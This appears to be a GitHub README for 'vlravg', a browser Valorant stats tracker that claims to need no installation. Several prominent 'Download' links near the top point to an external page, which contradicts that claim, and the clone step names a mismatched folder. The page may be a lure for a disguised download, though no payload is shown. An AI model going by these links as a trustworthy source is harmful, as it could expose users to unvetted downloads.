# vlravg - Valorant Stats Tracker 2026

> **A browser-based Valorant tracker that surfaces your average lobby rank, K/D splits, most common duo partners, and total playtime, using the HenrikDev API for live match data.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/benreedmyvw7163/valorant-vlravg-stats-hub?style=flat-square)](https://github.com/benreedmyvw7163/valorant-vlravg-stats-hub)

---

<p align="center">
  <a href="https://benreedmyvw7163.github.io/valorant-vlravg-stats-hub/">
    <img src="https://img.shields.io/badge/Download-vlravg%20Latest-brightgreen?style=for-the-badge" alt="Download vlravg">
  </a>
</p>

> **[Direct Download - vlravg](https://benreedmyvw7163.github.io/valorant-vlravg-stats-hub/)**

---

[Download Latest Build](https://benreedmyvw7163.github.io/valorant-vlravg-stats-hub/)

---

## What vlravg Does

vlravg is a compact web utility for Valorant players who want more than the usual win-loss summary. It takes your match history and turns it into useful context: the average rank of every lobby you join, match-by-match kill/death performance, and the players you end up queued with most often. If you play solo or regularly duo up, it helps you see your environment with a lot more clarity.

Behind the scenes, vlravg pulls current match information through the HenrikDev API, keeping the numbers tied to your latest games. It is aimed at players who prefer a quick, readable stat view instead of digging through raw logs. Just enter your Riot ID and let the tracker handle the rest.

---

## Highlights

- **Average Lobby Rank** - Shows the average rank across the players in each match so you can put your results in context.
- **K/D Breakdowns** - Displays your kill/death ratio for each game, along with averages from your recent matches.
- **Duos Tracking** - Highlights the teammates you queue with most often and how your numbers compare when you play together.
- **Playtime Tracking** - Keeps track of total playtime, session duration, and how often you play over time.
- **Real-Time Data** - Refreshes stats automatically through the HenrikDev API after every match.
- **Simple Web Interface** - Works entirely in the browser, with no installation step.
- **Lightweight & Fast** - Built with minimal dependencies for quick loading and immediate stat lookups.

---

## Setup

Because vlravg is delivered as a web app, there is no standard install process. You can use the hosted version directly, or clone the project if you want to open it locally:

```bash
git clone https://github.com/benreedmyvw7163/valorant-vlravg-stats-hub.git
cd vlravg
```

After that, open `index.html` in any modern browser. No build pipeline or server configuration is required.

---

## How to Use It

1. Open the vlravg page in your browser.
2. Type your full Riot ID, including the tagline, for example `Player#NA1`.
3. Select the "Fetch Stats" button.
4. Review your average lobby rank, K/D breakdowns, duos list, and playtime totals.

Example workflow:
- After a ranked session, open vlravg and check your average lobby rank to judge whether your matches are above or below your current rating.
- Look over your K/D for the last 10 games to identify dips, improvements, or streaks.
- Inspect the duos list to see which friends you sync best with.

---

## Settings

All preferences live in your browser's local storage, so there are no config files to manage. If you want to reset the tool or clear saved data, remove the browser cache for the vlravg page.

Advanced users can also adjust the API endpoint or request parameters inside `script.js` if they have their own HenrikDev API key.

---

## Requirements

- A modern web browser (Chrome, Firefox, Edge, or Safari).
- An active internet connection to fetch match data from the HenrikDev API.
- A valid Valorant Riot ID (with tagline) to look up stats.
- No additional software, plugins, or runtime environments required.

---

## Frequently Asked Questions

**How do I get support?**  
Open an issue in the GitHub repository and include the browser you are using plus any error details you can provide.

**How often are my stats updated?**  
Each time you click "Fetch Stats", vlravg requests the most recent match data available from the HenrikDev API.

**Can I change the API key?**  
Yes. Update the API key variable in `script.js` to use your own HenrikDev API key. The default may be rate-limited.

**Why don't I see my latest match?**  
There may be a short delay between the end of a game and the API exposing it. Try again in a few minutes.

**Is my data stored anywhere?**  
No. All data is fetched live from the API and shown in your browser. Nothing is stored on a server.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
